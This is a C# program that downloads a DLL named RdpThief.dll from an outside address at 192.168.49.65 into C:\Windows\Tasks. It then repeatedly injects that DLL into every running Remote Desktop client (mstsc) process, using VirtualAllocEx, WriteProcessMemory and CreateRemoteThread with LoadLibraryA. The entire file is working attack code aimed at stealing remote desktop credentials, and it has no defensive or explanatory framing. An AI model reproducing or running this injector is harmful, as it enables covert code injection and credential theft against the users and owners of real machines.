using System;
using System.Text;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace DLL_Injection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            //Drop dll
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = "C:\\Windows\\Tasks\\RdpThief.dll";
            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.49.65/RdpThief.dll", dllName);

            while (true)
            {
                //Open remote process
                Process[] p = Process.GetProcessesByName("mstsc");
                if ((p.Length) > 0)
                {
                    for (int i = 0; i < p.Length; i++)
                    {
                        int pid = p[i].Id;

                        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

                        //Reserve memory to copy the DLL on the remote process
                        //uint PAGE_EXECUTE_READWRITE = 0x40;
                        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                        IntPtr outSize;
                        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

                        //Address of the function LoadLibraryA. Note that the address should be the same on the local and remote process
                        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

                        //Create a thread on the remote process to run the dllName (at addr) by using LoadLibraryA
                        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
                    }
                }
                Thread.Sleep(1000);
             }
        }
    }
}
